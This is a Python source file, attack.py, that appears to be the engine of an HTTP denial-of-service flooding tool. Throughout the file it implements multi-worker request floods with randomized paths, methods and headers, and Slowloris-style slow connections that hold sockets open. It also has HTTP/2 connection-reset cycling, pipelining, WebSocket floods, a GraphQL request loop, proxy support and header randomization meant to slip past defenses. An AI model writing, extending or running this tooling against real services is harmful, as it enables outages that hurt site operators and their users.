#!/usr/bin/env python3
# attack.py
import asyncio
import websockets
import httpx
import random
import time
import os
import ssl
from urllib.parse import urlparse
from typing import List, Dict, Optional, Set, Tuple, Any
import logging
import signal
from dataclasses import dataclass, field

from utils import random_string
from core.rate_limiter import RateLimiter, BurstRateLimiter, AdaptiveRateLimiter, JitteredRateLimiter
from core.wordlist_manager import WordlistManager
from core.data_pool import DataPool
from core.attack_config import AttackConfig
from bypass.header_generator import HeaderGenerator, HeaderConfig

logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)


class ConnectionPool:
    """Connection pool with keep-alive support."""
    
    def __init__(self, max_size: int = 1000, keepalive_timeout: float = 5.0):
        self._pool: List[httpx.AsyncClient] = []
        self._max_size = max_size
        self._keepalive_timeout = keepalive_timeout
        self._lock = asyncio.Lock()
        self._closed = False
        self._last_use: Dict[int, float] = {}
    
    async def acquire(self, factory) -> httpx.AsyncClient:
        if self._closed:
            raise RuntimeError("Connection pool is closed")
        async with self._lock:
            if self._pool:
                client = self._pool.pop()
                client_id = id(client)
                if time.time() - self._last_use.get(client_id, 0) > self._keepalive_timeout:
                    await client.aclose()
                    return await factory()
                return client
        return await factory()
    
    async def release(self, client: httpx.AsyncClient):
        if self._closed:
            await client.aclose()
            return
        async with self._lock:
            if len(self._pool) < self._max_size:
                self._last_use[id(client)] = time.time()
                self._pool.append(client)
            else:
                await client.aclose()
    
    async def close_all(self):
        self._closed = True
        async with self._lock:
            for client in self._pool:
                try:
                    await asyncio.wait_for(client.aclose(), timeout=1.0)
                except Exception:
                    pass
            self._pool.clear()


class SlowRequestManager:
    """Manage slow HTTP connections."""
    
    def __init__(self, host: str, header_generator: HeaderGenerator, max_connections: int = 1000):
        self.host = host
        self.header_generator = header_generator
        self.max_connections = max_connections
        self._connections: Dict[asyncio.StreamWriter, asyncio.Task] = {}
        self._lock = asyncio.Lock()
        self._closed = False
        
    async def start_slow_request(self, url: str, shutdown_event: asyncio.Event) -> Optional[asyncio.Task]:
        if shutdown_event.is_set() or self._closed:
            return None
        async with self._lock:
            if len(self._connections) >= self.max_connections:
                return None
            task = asyncio.create_task(self._slow_connection_worker(url, shutdown_event))
            self._connections[id(task)] = task
            task.add_done_callback(lambda t: asyncio.create_task(self._cleanup_task(t)))
            return task
    
    async def _slow_connection_worker(self, url: str, shutdown_event: asyncio.Event):
        writer = None
        try:
            parsed = urlparse(url)
            target = self.host
            port = 443 if parsed.scheme == 'https' else 80
            ssl_context = ssl.create_default_context() if parsed.scheme == 'https' else None
            
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port, ssl=ssl_context),
                timeout=5.0
            )
            
            writer.write(f"GET {parsed.path or '/'} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
            await asyncio.wait_for(writer.drain(), timeout=2.0)
            
            headers = self.header_generator.generate(self.host)
            
            for k, v in headers.items():
                if shutdown_event.is_set():
                    break
                writer.write(f"{k}: {v}\r\n".encode())
                try:
                    await asyncio.wait_for(writer.drain(), timeout=1.0)
                except asyncio.TimeoutError:
                    break
                await asyncio.sleep(0.1 + random.uniform(0.0, 0.3))
            
            while not shutdown_event.is_set():
                await asyncio.sleep(1.0)
                try:
                    writer.write(f"X-KeepAlive: {random.randint(1000, 9999)}\r\n".encode())
                    await asyncio.wait_for(writer.drain(), timeout=1.0)
                except Exception:
                    break
        except asyncio.TimeoutError:
            logger.debug("Slow connection timeout")
        except Exception as e:
            logger.debug(f"Slow request error: {e}")
        finally:
            if writer:
                try:
                    writer.close()
                    await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
                except Exception:
                    pass
    
    async def _cleanup_task(self, task: asyncio.Task):
        async with self._lock:
            self._connections.pop(id(task), None)
    
    async def close_all(self):
        self._closed = True
        async with self._lock:
            tasks = list(self._connections.values())
            self._connections.clear()
        for task in tasks:
            task.cancel()
        if tasks:
            await asyncio.wait(tasks, timeout=3.0)


class HttpAttackEngine:
    """High-performance HTTP attack engine with pipelining support."""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.parsed_url = urlparse(config.url)
        self.host = self.parsed_url.netloc
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        
        self.wordlist_manager = WordlistManager()
        
        self.useragents: List[str] = []
        self.referers: List[str] = []
        self.paths: List[str] = []
        self.methods: List[str] = []
        self.fuzz_methods: List[str] = []
        
        self.header_generator: Optional[HeaderGenerator] = None
        
        self._data_pool: Optional[DataPool] = None
        
        self.sent = 0
        self.failed = 0
        self.skipped = 0
        self.start_time = time.time()
        self._stats_lock = asyncio.Lock()
        self.rps_history = []
        self.latency_samples = []
        
        self._shutdown_event = asyncio.Event()
        self._main_tasks: Set[asyncio.Task] = set()
        self._connection_pools: Dict[int, ConnectionPool] = {}
        self._slow_manager: Optional[SlowRequestManager] = None
        self._sigint_received = False
        
        self.rate_limiter: Optional[RateLimiter] = None
        
        self.BODY_METHODS = {'POST', 'PUT', 'PATCH', 'PROPFIND', 'REPORT', 'MKCOL', 'LOCK'}
    
    async def initialize(self):
        logger.info("Initializing HttpAttackEngine...")
        
        load_tasks = [
            self.wordlist_manager.load_user_agents(),
            self.wordlist_manager.load_referers(),
            self.wordlist_manager.load_paths(),
            self.wordlist_manager.load_http_methods(),
            self.wordlist_manager.load_fuzz_methods(),
        ]
        
        results = await asyncio.gather(*load_tasks)
        self.useragents = results[0] if results[0] else self.config.useragents
        self.referers = results[1]
        self.paths = results[2]
        self.methods = results[3] if not self.config.methods or self.config.methods == ['GET'] else self.config.methods
        self.fuzz_methods = results[4]
        
        if not self.useragents:
            self.useragents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]
        
        header_config = HeaderConfig(
            user_agents=self.useragents,
            referers=self.referers,
            use_junk=self.config.junk_headers,
            use_random_host=self.config.random_host,
            header_flood=self.config.header_flood,
            auth_token=self.config.auth_token,
            randomize_order=self.config.randomize_header_order,
            extra_headers=self.config.bypass_headers,
        )
        self.header_generator = HeaderGenerator(header_config)
        
        if self.config.max_rps > 0 or self.config.max_bandwidth_mbps > 0:
            if self.config.adaptive:
                self.rate_limiter = AdaptiveRateLimiter(
                    self.config.max_rps, self.config.max_bandwidth_mbps,
                    jitter_percent=self.config.jitter_percent
                )
            elif self.config.jitter_percent > 0:
                self.rate_limiter = JitteredRateLimiter(
                    self.config.max_rps, self.config.max_bandwidth_mbps,
                    jitter_percent=self.config.jitter_percent
                )
            else:
                self.rate_limiter = BurstRateLimiter(self.config.max_rps, self.config.max_bandwidth_mbps)
            logger.info(f"Rate limiter enabled: max_rps={self.config.max_rps}, jitter={self.config.jitter_percent}%")
        
        if self.config.data_size > 0:
            self._data_pool = DataPool(self.config.data_size, pool_size=100)
        
        logger.info(f"Engine ready: {len(self.paths)} paths, {len(self.useragents)} UAs, pipeline_depth={self.config.pipeline_depth}")
    
    async def __aenter__(self):
        await self.initialize()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.shutdown()
    
    async def start(self):
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, lambda: asyncio.create_task(self._handle_signal()))
            except NotImplementedError:
                pass
        
        try:
            if self.config.websocket:
                await self.websocket_flood()
            elif self.config.graphql_bomb:
                await self.send_graphql_bomb()
            else:
                await self._run_workers()
        except asyncio.CancelledError:
            logger.info("Attack cancelled")
        finally:
            await self.shutdown()
    
    async def _handle_signal(self):
        if not self._sigint_received:
            self._sigint_received = True
            logger.info("Received stop signal, shutting down...")
            await self.shutdown()
    
    async def _create_client_factory(self, worker_id: int):
        async def _factory():
            limits = httpx.Limits(
                max_connections=1000,
                max_keepalive_connections=20 if not self.config.extreme else 0,
                keepalive_expiry=self.config.keepalive_timeout if not self.config.extreme else 0.1
            )
            
            timeout = httpx.Timeout(
                connect=self.config.connection_timeout,
                read=self.config.read_timeout,
                write=self.config.connection_timeout,
                pool=1.0
            )
            
            client_args = {
                "verify": not self.config.no_ssl_check,
                "timeout": timeout,
                "limits": limits,
                "follow_redirects": False,
            }
            
            if self.config.use_http2:
                client_args["http2"] = True
            
            if self.config.proxy and not (self.config.use_http2 or self.config.use_http3):
                client_args["proxies"] = {"all://": self.config.proxy}
            
            client = httpx.AsyncClient(**client_args)
            await client.__aenter__()
            return client
        
        return _factory
    
    async def _get_connection_pool(self, worker_id: int) -> ConnectionPool:
        if worker_id not in self._connection_pools:
            self._connection_pools[worker_id] = ConnectionPool(
                max_size=self.config.sockets_per_worker * self.config.pipeline_depth,
                keepalive_timeout=self.config.keepalive_timeout
            )
        return self._connection_pools[worker_id]
    
    async def _worker(self, worker_id: int):
        pool = await self._get_connection_pool(worker_id)
        factory = await self._create_client_factory(worker_id)
        
        clients = []
        try:
            for _ in range(self.config.sockets_per_worker):
                client = await factory()
                clients.append(client)
                await pool.release(client)
            
            while not self._shutdown_event.is_set():
                client = await pool.acquire(factory)
                
                try:
                    if self.config.pipeline_depth > 1:
                        await self._send_pipelined_requests(client, worker_id)
                    else:
                        await self._send_single_request(client, worker_id)
                finally:
                    await pool.release(client)
                
                if not self.config.flood:
                    await asyncio.sleep(random.uniform(0.005, 0.05))
                else:
                    await asyncio.sleep(0)
                    
        except asyncio.CancelledError:
            logger.debug(f"Worker {worker_id} cancelled")
        except Exception as e:
            logger.error(f"Worker {worker_id} error: {e}", exc_info=self.config.debug)
        finally:
            for client in clients:
                try:
                    await client.aclose()
                except Exception:
                    pass
    
    async def _send_single_request(self, client, worker_id: int):
        method = self._get_random_method()
        url = self._build_random_url()
        headers = self.header_generator.generate(self.host)
        
        data = None
        if method in self.BODY_METHODS and self.config.data_size > 0:
            data = self._prepare_body(method)
        
        request_size = self._estimate_request_size(method, url, headers, data)
        
        if self.rate_limiter and not await self.rate_limiter.acquire(request_size):
            async with self._stats_lock:
                self.skipped += 1
            return
        
        await self._send_request(client, method, url, headers, data)
        
        if self.config.h2reset:
            await client.aclose()
            client = await (await self._create_client_factory(worker_id))()
        
        if random.random() < self.config.slow_rate and self._slow_manager:
            await self._slow_manager.start_slow_request(url, self._shutdown_event)
    
    async def _send_pipelined_requests(self, client, worker_id: int):
        pipeline_depth = self.config.pipeline_depth
        methods = [self._get_random_method() for _ in range(pipeline_depth)]
        urls = [self._build_random_url() for _ in range(pipeline_depth)]
        headers_list = [self.header_generator.generate(self.host) for _ in range(pipeline_depth)]
        
        data_list = []
        total_size = 0
        for method in methods:
            data = None
            if method in self.BODY_METHODS and self.config.data_size > 0:
                data = self._prepare_body(method)
            data_list.append(data)
            total_size += self._estimate_request_size(method, urls[0], headers_list[0], data)
        
        if self.rate_limiter and not await self.rate_limiter.acquire(total_size):
            async with self._stats_lock:
                self.skipped += pipeline_depth
            return
        
        for i in range(pipeline_depth):
            await self._send_request(client, methods[i], urls[i], headers_list[i], data_list[i])
    
    def _prepare_body(self, method: str) -> str:
        if method in {'PROPFIND', 'REPORT', 'LOCK', 'MKCOL'}:
            xml_template = '<?xml version="1.0"?><propfind xmlns="DAV:"><allprop/></propfind>'
            if self.config.data_size > len(xml_template):
                xml_template += 'X' * (self.config.data_size - len(xml_template))
            return xml_template
        else:
            if self._data_pool:
                return self._data_pool.get_random()
            return 'X' * self.config.data_size
    
    def _estimate_request_size(self, method: str, url: str, headers: dict, data: str = None) -> int:
        size = len(method) + len(url) + 20
        for k, v in headers.items():
            size += len(k) + len(v) + 4
        if data:
            size += len(data)
        return size
    
    def _build_random_url(self) -> str:
        path = random.choice(self.paths)
        
        if self.config.path_fuzz and random.random() < 0.3:
            depth = random.randint(2, 5)
            path += "/" + "/".join(random_string(6) for _ in range(depth))
        
        query = f"?t={random.randint(1000, 9999)}&r={random_string(4)}"
        full = self.base_url + path + query
        
        if len(full) > 2048:
            path = path[:2048 - len(self.base_url) - len(query) - 10]
            full = self.base_url + path + query
        
        return full
    
    def _get_random_method(self) -> str:
        if self.config.method_fuzz and random.random() < 0.2:
            return random.choice(self.fuzz_methods)
        return random.choice(self.methods)
    
    async def _send_request(self, client, method, url, headers, data):
        start = time.time()
        try:
            response = await client.request(
                method, url, 
                headers=headers, 
                content=data,
                follow_redirects=False
            )
            latency_ms = (time.time() - start) * 1000
            
            async with self._stats_lock:
                self.sent += 1
                self.latency_samples.append(latency_ms)
                if len(self.latency_samples) > 1000:
                    self.latency_samples = self.latency_samples[-1000:]
            
            if isinstance(self.rate_limiter, AdaptiveRateLimiter):
                self.rate_limiter.record_latency(latency_ms)
                
        except Exception as e:
            async with self._stats_lock:
                self.failed += 1
            if self.config.debug:
                logger.debug(f"Request failed: {e}")
    
    async def _run_workers(self):
        logger.info(f"Starting attack: {self.config.workers} workers, {self.config.sockets_per_worker} sockets, pipeline={self.config.pipeline_depth}")
        
        if self.config.slow_rate > 0:
            self._slow_manager = SlowRequestManager(
                self.host, self.header_generator,
                max_connections=self.config.slow_connections
            )
            logger.info(f"Slow request manager initialized")
        
        for i in range(self.config.workers):
            task = asyncio.create_task(self._worker(i), name=f"worker-{i}")
            self._main_tasks.add(task)
            task.add_done_callback(self._main_tasks.discard)
        
        monitor_task = asyncio.create_task(self._monitor(), name="monitor")
        self._main_tasks.add(monitor_task)
        monitor_task.add_done_callback(self._main_tasks.discard)
        
        stats_task = asyncio.create_task(self._collect_stats(), name="stats")
        self._main_tasks.add(stats_task)
        stats_task.add_done_callback(self._main_tasks.discard)
        
        if isinstance(self.rate_limiter, AdaptiveRateLimiter):
            await self.rate_limiter.start_adaptive_adjustment()
        
        if self.config.duration > 0:
            asyncio.create_task(self._duration_timer())
        
        try:
            await asyncio.gather(*self._main_tasks, return_exceptions=True)
        except asyncio.CancelledError:
            logger.info("Worker pool cancelled")
    
    async def _duration_timer(self):
        await asyncio.sleep(self.config.duration)
        if not self._shutdown_event.is_set():
            logger.info(f"Duration {self.config.duration}s reached, stopping")
            await self.shutdown()
    
    async def _monitor(self):
        last_sent = 0
        last_time = time.time()
        
        try:
            while not self._shutdown_event.is_set():
                await asyncio.sleep(0.5)
                
                now = time.time()
                elapsed = now - last_time
                
                async with self._stats_lock:
                    current_sent = self.sent
                    current_failed = self.failed
                    current_skipped = self.skipped
                
                if elapsed > 0:
                    rps = int((current_sent - last_sent) / elapsed)
                    
                    limiter_info = ""
                    if self.rate_limiter:
                        stats = self.rate_limiter.get_stats()
                        if stats['limited'] > 0:
                            limiter_info = f" | Limited: {stats['limited']}"
                    
                    lat_info = ""
                    if self.latency_samples:
                        avg_lat = sum(self.latency_samples[-10:]) / min(10, len(self.latency_samples))
                        lat_info = f" | {avg_lat:.1f}ms"
                    
                    print(f"\rSent: {current_sent:,} | Failed: {current_failed:,} | RPS: {rps:4d} | Time: {int(now - self.start_time)}s{limiter_info}{lat_info}", end="")
                    
                    last_sent = current_sent
                    last_time = now
                    
        except asyncio.CancelledError:
            self._print_final_stats()
    
    async def _collect_stats(self):
        last_sent = 0
        try:
            while not self._shutdown_event.is_set():
                await asyncio.sleep(1.0)
                async with self._stats_lock:
                    now = int(time.time() - self.start_time)
                    rps = self.sent - last_sent
                    self.rps_history.append({'time': now, 'rps': rps})
                    if len(self.rps_history) > 3600:
                        self.rps_history = self.rps_history[-3600:]
                    last_sent = self.sent
        except asyncio.CancelledError:
            pass
    
    def _print_final_stats(self):
        elapsed = time.time() - self.start_time
        if elapsed < 1:
            return
            
        avg_rps = self.sent / elapsed
        error_rate = (self.failed / (self.sent + self.failed + 1)) * 100
        
        print(f"\n\n{'='*60}")
        print(f"Attack completed")
        print(f"Duration: {elapsed:.1f}s")
        print(f"Total requests: {self.sent:,}")
        print(f"Failed: {self.failed:,} ({error_rate:.1f}%)")
        print(f"Average RPS: {avg_rps:.1f}")
        
        if self.rate_limiter:
            stats = self.rate_limiter.get_stats()
            print(f"Rate limited: {stats['limited']:,} ({stats['limited_percent']:.1f}%)")
        
        if self.latency_samples:
            avg_lat = sum(self.latency_samples) / len(self.latency_samples)
            max_lat = max(self.latency_samples)
            print(f"Avg latency: {avg_lat:.1f}ms (max: {max_lat:.1f}ms)")
    
    async def websocket_flood(self):
        logger.info(f"Starting WebSocket flood to {self.config.url}")
        ws_url = self.config.url.replace("http", "ws")
        
        tasks = []
        try:
            for i in range(min(self.config.workers * self.config.sockets_per_worker, 1000)):
                task = asyncio.create_task(self._ws_worker(ws_url, i))
                tasks.append(task)
                self._main_tasks.add(task)
                task.add_done_callback(self._main_tasks.discard)
            
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            logger.error(f"WebSocket flood error: {e}")
    
    async def _ws_worker(self, uri: str, worker_id: int):
        while not self._shutdown_event.is_set():
            try:
                async with websockets.connect(
                    uri, 
                    ssl=(not self.config.no_ssl_check),
                    ping_interval=20,
                    ping_timeout=10,
                    close_timeout=5
                ) as ws:
                    while not self._shutdown_event.is_set():
                        data = random_string(random.randint(32, 256))
                        
                        if self.rate_limiter and not await self.rate_limiter.acquire(len(data)):
                            async with self._stats_lock:
                                self.skipped += 1
                            await asyncio.sleep(0.01)
                            continue
                        
                        await ws.send(data)
                        async with self._stats_lock:
                            self.sent += 1
                        
                        await asyncio.sleep(0.1 if not self.config.flood else 0)
                        
            except websockets.ConnectionClosed:
                logger.debug(f"WebSocket {worker_id} connection closed")
            except Exception as e:
                if self.config.debug:
                    logger.debug(f"WebSocket {worker_id} error: {e}")
            
            await asyncio.sleep(0.1)
    
    async def send_graphql_bomb(self):
        logger.info("Starting GraphQL bomb")
        url = self.config.url.rstrip("/") + "/graphql"
        base_query = {"query": "query { __typename }"}
        query_size = len(str(base_query).encode())
        
        async with httpx.AsyncClient(timeout=30) as client:
            for i in range(1000):
                if self._shutdown_event.is_set():
                    break
                
                if self.rate_limiter and not await self.rate_limiter.acquire(query_size):
                    async with self._stats_lock:
                        self.skipped += 1
                    await asyncio.sleep(0.001)
                    continue
                
                try:
                    await client.post(url, json=base_query)
                    async with self._stats_lock:
                        self.sent += 1
                except Exception:
                    async with self._stats_lock:
                        self.failed += 1
                
                await asyncio.sleep(0.001)
    
    async def shutdown(self):
        if self._shutdown_event.is_set():
            return
        
        logger.info("Shutting down attack engine...")
        self._shutdown_event.set()
        
        if isinstance(self.rate_limiter, AdaptiveRateLimiter):
            await self.rate_limiter.stop_adaptive_adjustment()
        
        for task in self._main_tasks:
            task.cancel()
        
        if self._main_tasks:
            await asyncio.wait(self._main_tasks, timeout=5.0)
        
        if self._slow_manager:
            await self._slow_manager.close_all()
        
        for pool in self._connection_pools.values():
            await pool.close_all()
        
        self._print_final_stats()
        logger.info("Shutdown complete")